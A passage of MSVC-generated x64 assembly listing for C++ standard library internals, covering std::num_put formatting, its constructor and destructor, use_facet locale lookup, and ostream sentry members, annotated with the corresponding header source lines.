	pop	rsi
	ret	0
?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBX@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z
_TEXT	SEGMENT
$T1 = 48
this$ = 96
__$ReturnUdt$ = 104
_Dest$ = 112
_Iosbase$ = 120
_Fill$ = 128
_Val$ = 136
?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put, COMDAT

; 1208 :         _OutIt _Dest, ios_base& _Iosbase, _Elem _Fill, long _Val) const { // put formatted long to _Dest

$LN3:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 72					; 00000048H

; 1209 :         return do_put(_Dest, _Iosbase, _Fill, _Val);

	lea	rax, QWORD PTR $T1[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR this$[rsp]
	mov	rax, QWORD PTR [rax]
	mov	ecx, DWORD PTR _Val$[rsp]
	mov	DWORD PTR [rsp+40], ecx
	movzx	ecx, BYTE PTR _Fill$[rsp]
	mov	BYTE PTR [rsp+32], cl
	mov	r9, QWORD PTR _Iosbase$[rsp]
	lea	r8, QWORD PTR $T1[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	QWORD PTR [rax+72]
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1210 :     }

	add	rsp, 72					; 00000048H
	pop	rdi
	pop	rsi
	ret	0
?put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DJ@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::put
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z
_TEXT	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >, COMDAT

; 1195 :     __CLR_OR_THIS_CALL num_put(const _Locinfo& _Lobj, size_t _Refs = 0) : locale::facet(_Refs) {

$LN4:
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rdx, QWORD PTR _Refs$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0facet@locale@std@@IEAA@_K@Z		; std::locale::facet::facet
	npad	1
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@
	mov	QWORD PTR [rax], rcx

; 1196 :         _Init(_Lobj);

	mov	rdx, QWORD PTR _Lobj$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Init@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@IEAAXAEBV_Locinfo@2@@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Init
	npad	1

; 1197 :     }

	mov	rax, QWORD PTR this$[rsp]
	add	rsp, 40					; 00000028H
	ret	0
??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
this$ = 48
_Lobj$ = 56
_Refs$ = 64
?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	rcx, QWORD PTR this$[rbp]
	call	??1facet@locale@std@@MEAA@XZ		; std::locale::facet::~facet
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Init@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@IEAAXAEBV_Locinfo@2@@Z
_TEXT	SEGMENT
this$ = 8
__formal$ = 16
?_Init@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@IEAAXAEBV_Locinfo@2@@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Init, COMDAT

; 1186 :     void __CLR_OR_THIS_CALL _Init(const _Locinfo&) {} // initialize from _Locinfo object

	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	ret	0
?_Init@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@IEAAXAEBV_Locinfo@2@@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Init
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ
_TEXT	SEGMENT
this$ = 48
??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::~num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >, COMDAT

; 1184 :     __CLR_OR_THIS_CALL ~num_put() noexcept override {}

$LN3:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 40					; 00000028H
	mov	rax, QWORD PTR this$[rsp]
	lea	rcx, OFFSET FLAT:??_7?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@6B@
	mov	QWORD PTR [rax], rcx
	mov	rcx, QWORD PTR this$[rsp]
	call	??1facet@locale@std@@MEAA@XZ		; std::locale::facet::~facet
	add	rsp, 40					; 00000028H
	ret	0
??1?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@MEAA@XZ ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::~num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z
_TEXT	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat, COMDAT

; 1172 :     static size_t __CLRCALL_OR_CDECL _Getcat(const locale::facet** _Ppf = nullptr, const locale* _Ploc = nullptr) {

$LN10:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 200				; 000000c8H
	mov	DWORD PTR $T1[rsp], 0

; 1173 :         // return locale category mask and construct standard facet
; 1174 :         if (_Ppf && !*_Ppf) {

	cmp	QWORD PTR _Ppf$[rsp], 0
	je	$LN2@Getcat
	mov	rax, QWORD PTR _Ppf$[rsp]
	cmp	QWORD PTR [rax], 0
	jne	$LN2@Getcat

; 1175 :             *_Ppf = new num_put<_Elem, _OutIt>(_Locinfo(_Ploc->c_str()));

	mov	ecx, 16
	call	??2@YAPEAX_K@Z				; operator new
	mov	QWORD PTR $T2[rsp], rax
	cmp	QWORD PTR $T2[rsp], 0
	je	SHORT $LN4@Getcat
	mov	rcx, QWORD PTR _Ploc$[rsp]
	call	?c_str@locale@std@@QEBAPEBDXZ		; std::locale::c_str
	mov	rdx, rax
	lea	rcx, QWORD PTR $T4[rsp]
	call	??0_Locinfo@std@@QEAA@PEBD@Z		; std::_Locinfo::_Locinfo
	mov	QWORD PTR tv131[rsp], rax
	mov	rax, QWORD PTR tv131[rsp]
	mov	QWORD PTR tv128[rsp], rax
	mov	eax, DWORD PTR $T1[rsp]
	or	eax, 1
	mov	DWORD PTR $T1[rsp], eax
	xor	r8d, r8d
	mov	rdx, QWORD PTR tv128[rsp]
	mov	rcx, QWORD PTR $T2[rsp]
	call	??0?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@QEAA@AEBV_Locinfo@1@_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >
	mov	QWORD PTR tv89[rsp], rax
	jmp	SHORT $LN5@Getcat
$LN4@Getcat:
	mov	QWORD PTR tv89[rsp], 0
$LN5@Getcat:
	mov	rax, QWORD PTR tv89[rsp]
	mov	QWORD PTR $T3[rsp], rax
	mov	rax, QWORD PTR _Ppf$[rsp]
	mov	rcx, QWORD PTR $T3[rsp]
	mov	QWORD PTR [rax], rcx
	mov	eax, DWORD PTR $T1[rsp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN2@Getcat
	and	DWORD PTR $T1[rsp], -2
	lea	rcx, QWORD PTR $T4[rsp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN2@Getcat:

; 1176 :         }
; 1177 : 
; 1178 :         return _X_NUMERIC;

	mov	eax, 4

; 1179 :     }

	add	rsp, 200				; 000000c8H
	ret	0
?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	edx, 16
	mov	rcx, QWORD PTR $T2[rbp]
	call	??3@YAXPEAX_K@Z				; operator delete
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
$T1 = 32
$T2 = 40
tv89 = 48
tv131 = 56
tv128 = 64
$T3 = 72
$T4 = 80
_Ppf$ = 208
_Ploc$ = 216
?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	mov	eax, DWORD PTR $T1[rbp]
	and	eax, 1
	test	eax, eax
	je	SHORT $LN8@dtor$1
	and	DWORD PTR $T1[rbp], -2
	lea	rcx, QWORD PTR $T4[rbp]
	call	??1_Locinfo@std@@QEAA@XZ		; std::_Locinfo::~_Locinfo
$LN8@dtor$1:
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocale
;	COMDAT ??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z
_TEXT	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z PROC ; std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >, COMDAT

; 422  : const _Facet& __CRTDECL use_facet(const locale& _Loc) { // get facet reference from locale

$LN11:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 104				; 00000068H

; 423  :     _BEGIN_LOCK(_LOCK_LOCALE) // the thread lock, make get atomic

	xor	edx, edx
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??0_Lockit@std@@QEAA@H@Z		; std::_Lockit::_Lockit
	npad	1

; 424  :     const locale::facet* _Psave = _Facetptr<_Facet>::_Psave; // static pointer to lazy facet

	mov	rax, QWORD PTR ?_Psave@?$_Facetptr@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@2PEBVfacet@locale@2@EB ; std::_Facetptr<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >::_Psave
	mov	QWORD PTR _Psave$2[rsp], rax

; 425  : 
; 426  :     const size_t _Id         = _Facet::id;

	lea	rcx, OFFSET FLAT:?id@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@2V0locale@2@A ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::id
	call	??Bid@locale@std@@QEAA_KXZ		; std::locale::id::operator unsigned __int64
	mov	QWORD PTR _Id$6[rsp], rax

; 427  :     const locale::facet* _Pf = _Loc._Getfacet(_Id);

	mov	rdx, QWORD PTR _Id$6[rsp]
	mov	rcx, QWORD PTR _Loc$[rsp]
	call	?_Getfacet@locale@std@@QEBAPEBVfacet@12@_K@Z ; std::locale::_Getfacet
	mov	QWORD PTR _Pf$4[rsp], rax

; 428  : 
; 429  :     if (!_Pf) {

	cmp	QWORD PTR _Pf$4[rsp], 0
	jne	$LN2@use_facet

; 430  :         if (_Psave) {

	cmp	QWORD PTR _Psave$2[rsp], 0
	je	SHORT $LN3@use_facet

; 431  :             _Pf = _Psave; // lazy facet already allocated

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax
	jmp	SHORT $LN2@use_facet
$LN3@use_facet:

; 432  :         } else if (_Facet::_Getcat(&_Psave, &_Loc) == static_cast<size_t>(-1)) {

	mov	rdx, QWORD PTR _Loc$[rsp]
	lea	rcx, QWORD PTR _Psave$2[rsp]
	call	?_Getcat@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@SA_KPEAPEBVfacet@locale@2@PEBV42@@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Getcat
	cmp	rax, -1
	jne	SHORT $LN5@use_facet

; 433  : #if _HAS_EXCEPTIONS
; 434  :             _Throw_bad_cast(); // lazy disallowed

	call	?_Throw_bad_cast@std@@YAXXZ		; std::_Throw_bad_cast
	npad	1

; 435  : #else // _HAS_EXCEPTIONS
; 436  :             _CSTD abort(); // lazy disallowed
; 437  : #endif // _HAS_EXCEPTIONS
; 438  :         } else { // queue up lazy facet for destruction

	jmp	SHORT $LN2@use_facet
$LN5@use_facet:

; 439  :             auto _Pfmod = const_cast<locale::facet*>(_Psave);

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pfmod$3[rsp], rax

; 440  :             unique_ptr<_Facet_base> _Psave_guard(static_cast<_Facet_base*>(_Pfmod));

	mov	rdx, QWORD PTR _Pfmod$3[rsp]
	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??$?0U?$default_delete@V_Facet_base@std@@@std@@$0A@@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@PEAV_Facet_base@1@@Z ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> ><std::default_delete<std::_Facet_base>,0>
	npad	1

; 441  : 
; 442  : #if defined(_M_CEE)
; 443  :             _Facet_Register_m(_Pfmod);
; 444  : #else // defined(_M_CEE)
; 445  :             _Facet_Register(_Pfmod);

	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	?_Facet_Register@std@@YAXPEAV_Facet_base@1@@Z ; std::_Facet_Register

; 446  : #endif // defined(_M_CEE)
; 447  : 
; 448  :             _Pfmod->_Incref();

	mov	rax, QWORD PTR _Pfmod$3[rsp]
	mov	rax, QWORD PTR [rax]
	mov	rcx, QWORD PTR _Pfmod$3[rsp]
	call	QWORD PTR [rax+8]

; 449  :             _Facetptr<_Facet>::_Psave = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR ?_Psave@?$_Facetptr@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@2PEBVfacet@locale@2@EB, rax ; std::_Facetptr<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >::_Psave

; 450  :             _Pf                       = _Psave;

	mov	rax, QWORD PTR _Psave$2[rsp]
	mov	QWORD PTR _Pf$4[rsp], rax

; 451  : 
; 452  :             (void) _Psave_guard.release();

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	?release@?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAAPEAV_Facet_base@2@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::release
	npad	1

; 453  :         }

	lea	rcx, QWORD PTR _Psave_guard$5[rsp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
$LN2@use_facet:

; 454  :     }
; 455  : 
; 456  :     return static_cast<const _Facet&>(*_Pf); // should be dynamic_cast

	mov	rax, QWORD PTR _Pf$4[rsp]
	mov	QWORD PTR $T7[rsp], rax
	lea	rcx, QWORD PTR _Lock$1[rsp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	mov	rax, QWORD PTR $T7[rsp]

; 457  :     _END_LOCK()
; 458  : } // end of use_facet body

	add	rsp, 104				; 00000068H
	ret	0
$LN10@use_facet:
??$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z ENDP ; std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Lock$1[rbp]
	call	??1_Lockit@std@@QEAA@XZ			; std::_Lockit::~_Lockit
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Lock$1 = 32
_Psave$2 = 40
_Pfmod$3 = 48
_Pf$4 = 56
_Psave_guard$5 = 64
_Id$6 = 72
$T7 = 80
_Loc$ = 112
?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA PROC ; `std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Psave_guard$5[rbp]
	call	??1?$unique_ptr@V_Facet_base@std@@U?$default_delete@V_Facet_base@std@@@2@@std@@QEAA@XZ ; std::unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >::~unique_ptr<std::_Facet_base,std::default_delete<std::_Facet_base> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0???$use_facet@V?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@@std@@YAAEBV?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@0@AEBVlocale@0@@Z@4HA ENDP ; `std::use_facet<std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > > >'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool, COMDAT

; 123  :         explicit __CLR_OR_THIS_CALL operator bool() const {

	mov	QWORD PTR [rsp+8], rcx

; 124  :             return _Ok;

	mov	rax, QWORD PTR this$[rsp]
	movzx	eax, BYTE PTR [rax+8]

; 125  :         }

	ret	0
??Bsentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEBA_NXZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::operator bool
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ
_TEXT	SEGMENT
tv72 = 32
_Zero_uncaught_exceptions$ = 33
this$ = 64
??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry, COMDAT

; 108  :         __CLR_OR_THIS_CALL ~sentry() noexcept {

$LN6:
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H

; 109  : #if !_HAS_EXCEPTIONS
; 110  :             const bool _Zero_uncaught_exceptions = true;
; 111  : #elif _HAS_DEPRECATED_UNCAUGHT_EXCEPTION
; 112  :             const bool _Zero_uncaught_exceptions = !_STD uncaught_exception(); // TRANSITION, ArchivedOS-12000909

	call	?uncaught_exception@std@@YA_NXZ		; std::uncaught_exception
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN4@sentry
	mov	BYTE PTR tv72[rsp], 1
	jmp	SHORT $LN5@sentry
$LN4@sentry:
	mov	BYTE PTR tv72[rsp], 0
$LN5@sentry:
	movzx	eax, BYTE PTR tv72[rsp]
	mov	BYTE PTR _Zero_uncaught_exceptions$[rsp], al

; 113  : #else // ^^^ _HAS_DEPRECATED_UNCAUGHT_EXCEPTION / !_HAS_DEPRECATED_UNCAUGHT_EXCEPTION vvv
; 114  :             const bool _Zero_uncaught_exceptions = _STD uncaught_exceptions() == 0;
; 115  : #endif // !_HAS_DEPRECATED_UNCAUGHT_EXCEPTION
; 116  : 
; 117  :             if (_Zero_uncaught_exceptions) {

	movzx	eax, BYTE PTR _Zero_uncaught_exceptions$[rsp]
	test	eax, eax
	je	SHORT $LN2@sentry

; 118  :                 this->_Myostr._Osfx();

	mov	rax, QWORD PTR this$[rsp]
	mov	rcx, QWORD PTR [rax]
	call	?_Osfx@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAAXXZ ; std::basic_ostream<char,std::char_traits<char> >::_Osfx
$LN2@sentry:

; 119  :             }
; 120  :         }

	mov	rcx, QWORD PTR this$[rsp]
	call	??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::~_Sentry_base
	npad	1
	add	rsp, 56					; 00000038H
	ret	0
??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@XZ ENDP ; std::basic_ostream<char,std::char_traits<char> >::sentry::~sentry
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\ostream
;	COMDAT ??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z
_TEXT	SEGMENT
_Tied$ = 32
this$ = 64
_Ostr$ = 72
??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z PROC ; std::basic_ostream<char,std::char_traits<char> >::sentry::sentry, COMDAT

; 91   :         explicit __CLR_OR_THIS_CALL sentry(basic_ostream& _Ostr) : _Sentry_base(_Ostr) {

$LN7:
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 56					; 00000038H
	mov	rdx, QWORD PTR _Ostr$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	??0_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QEAA@AEAV12@@Z ; std::basic_ostream<char,std::char_traits<char> >::_Sentry_base::_Sentry_base
	npad	1

; 92   :             if (!_Ostr.good()) {

	mov	rax, QWORD PTR _Ostr$[rsp]
	mov	rax, QWORD PTR [rax]
	movsxd	rax, DWORD PTR [rax+4]
	mov	rcx, QWORD PTR _Ostr$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rcx, rax
	call	?good@ios_base@std@@QEBA_NXZ		; std::ios_base::good
	movzx	eax, al
	test	eax, eax
	jne	SHORT $LN2@sentry

; 93   :                 _Ok = false;

	mov	rax, QWORD PTR this$[rsp]
	mov	BYTE PTR [rax+8], 0

; 94   :                 return;

	jmp	SHORT $LN1@sentry
$LN2@sentry:

; 95   :             }
